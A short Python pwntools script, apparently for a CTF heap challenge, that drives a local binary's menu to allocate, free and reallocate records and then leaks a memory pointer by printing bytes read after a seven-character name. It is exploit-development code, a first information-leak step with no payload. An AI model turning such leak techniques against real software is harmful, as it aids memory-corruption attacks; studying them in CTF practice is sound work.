from pwn import *

e = ELF('./ritsecctf/challenge2/pwn2')
r = process(e.path)
gdb.attach(r)
raw_input("xploit?")

r.recvuntil('Enter your choice: ')
r.sendline('1')
r.recvuntil('Enter name length: ')
r.sendline('155')
r.recvuntil('Enter person\'s name: ')
r.sendline('aaaa')
r.recvuntil('Enter person\'s age: ')
r.sendline('11')

r.recvuntil('Enter your choice: ')
r.sendline('1')
r.recvuntil('Enter name length: ')
r.sendline('155')
r.recvuntil('Enter person\'s name: ')
r.sendline('bbbb')
r.recvuntil('Enter person\'s age: ')
r.sendline('22')

r.recvuntil('choice: ')
r.sendline('4')
r.recvuntil('(0-based): ')
r.sendline('0')

r.recvuntil('Enter your choice: ')
r.sendline('1')
r.recvuntil('Enter name length: ')
r.sendline('155')
r.recvuntil('Enter person\'s name: ')
r.sendline('c' * 7)
r.recvuntil('Enter person\'s age: ')
r.sendline('33')


r.recvuntil('choice: ')
r.sendline('3')
r.recvuntil('(0-based): ')
r.sendline('0')
r.recvuntil('c' * 7 + '\n')
x = r.recv(6).ljust(8, '\x00')
print hex(u64(x))

r.close()

